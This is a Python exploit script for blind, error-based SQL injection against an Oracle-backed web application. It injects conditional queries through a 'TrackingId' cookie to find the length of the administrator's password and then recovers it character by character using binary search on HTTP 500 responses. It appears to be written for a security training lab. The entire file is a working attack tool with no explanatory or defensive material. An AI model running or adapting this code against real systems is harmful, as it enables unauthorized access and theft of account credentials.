import helper
import ast
import signal
import string
import sys
from bsqli import SqliHttpRequest
from bsqli import binary_search
from bsqli import linear_search

def password_size_handler(val, op, pos):
  sql_passwd_inj = "LENGTH((SELECT password FROM users WHERE username = 'administrator')) {} '{}'".format(op, val)
  sql = helper.sqli_cond_error(sql_passwd_inj, 'Oracle')
  req.inject('cookie', 'TrackingId', sql)

  resp = req.get()
  if not resp.status_code in [200, 500]:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  return resp.status_code == 500

def password_search_handler(val, op, pos):
  sql_passwd_inj = "SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {}, 1) {} '{}'".format(pos, op, val)
  sql = helper.sqli_cond_error(sql_passwd_inj, 'Oracle')
  req.inject('cookie', 'TrackingId', sql)
  resp = req.get()
  if not resp.status_code in [200, 500]:
    print(f"HTTP Request failed with code {resp.status_code}")
    exit(1)

  return resp.status_code == 500

if __name__ == "__main__":
  signal.signal(signal.SIGINT, helper.interrupt_handler)
  verbose, target, cookies = helper.args()
  data = helper.prepare_lc_alphanumeric_data()

  if verbose:
    print(target)
    print(cookies)
    print(data)
  
  req = SqliHttpRequest(target, helper.headers, cookies)
  print("extracting password length...")
  password_len = linear_search(list(range(0, 30)), password_size_handler, 1)

  if not password_len or password_len == 0:
    print('ERROR: failed to retrieve password length!')
    exit(1)

  print(f"password length: {password_len}")
  password = []
  for pos in range(1,int(password_len)+1):
    password.append(binary_search(data, password_search_handler, pos))
    print('extracting password [%d%%]\r'%(int(pos / password_len * 100)), end="")
  
  print("\nPassword: {}".format("".join(password)), flush=True)

